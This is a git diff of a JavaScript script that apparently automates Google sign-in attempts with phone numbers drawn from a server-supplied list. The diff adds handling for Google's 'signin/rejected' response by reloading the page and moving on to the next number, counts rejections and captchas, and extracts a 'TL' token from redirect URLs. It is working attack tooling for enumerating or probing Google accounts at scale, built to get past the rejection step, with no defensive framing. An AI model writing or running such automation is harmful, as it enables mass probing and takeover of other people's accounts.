@@ -22,7 +22,9 @@ let mToken = null
 
 let mTimeToken = null
 let mMultiPol = 0
-let mNumber = 591
+let mNumber = 1172
+let mCaptcha = 0
+let mReject = 0
 
 let signIn = 'https://accounts.google.com/ServiceLogin?continue=https%3A%2F%2Fmyaccount.google.com%2Fphone&rip=1&nojavascript=1&ifkv=AX3vH3_8OID3jcdWI28sWhLKyWZfo4meEPPnetcotLVnH3ejfs06Wk_CtNS4zazcrE3kC6LvY3Qy&flowEntry=ServiceLogin&flowName=GlifWebSignIn&hl=en-US&service=accountsettings'
 
@@ -121,15 +123,39 @@ async function logInNumber(number) {
                 headers: headers,
                 body: getNumberData(CODE+number, Identifier)
             }, function(error, responce, body) {
+                let next = true
                 try {
                     if(!(error || responce.headers == null)) {
                         let url = responce.headers['location']
-                        console.log(url)
-                        mNumber++
-                        console.log(mNumber)
-                        logInNumber(mServerData[mNumber])
+                        if(url != null) {
+                            if(url.startsWith('https://accounts.google.com/signin/rejected')) {
+                                next = false
+                                ;(async () => {
+                                    mReject++
+                                    console.log('Reload Page')
+                                    mReloadPage = true
+                                    await page.goto(signIn)
+                                    mReloadPage = false
+                                    mNumber++
+                                    console.log(mNumber, mReject, mCaptcha)
+                                    logInNumber(mServerData[mNumber])
+                                })()
+                            } else {
+                                let index = url.indexOf('TL=')
+                                if(index != -1) {
+                                    let tl = url.substring(index+3, url.length).split('&')[0]
+                                    console.log(tl)
+                                }
+                            }
+                        }
                     }
                 } catch (e) {}
+                
+                if(next) {
+                    mNumber++
+                    console.log(mNumber, mReject, mCaptcha)
+                    logInNumber(mServerData[mNumber])
+                }
             })
         } else {
             await delay(1000)
